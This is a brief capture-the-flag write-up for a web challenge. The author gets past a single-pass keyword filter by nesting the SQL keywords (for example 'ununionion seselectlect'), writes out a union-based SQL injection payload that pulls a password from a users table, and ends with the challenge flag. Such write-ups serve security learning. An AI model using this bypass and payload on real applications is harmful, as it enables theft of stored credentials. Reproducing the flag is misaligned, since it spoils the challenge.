Oh no, a wordlist filter. What shall I do?

My previous payload `1 = 2 union select 1,password from users where id=1 --` no longer works

It removes `union`, `select`, and `from`. Does it do multiple passes? 

`1 = 2 ununionion seselectlect 1,password frfromom users where id=1 --`

Apparently not.
Flag is `WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`
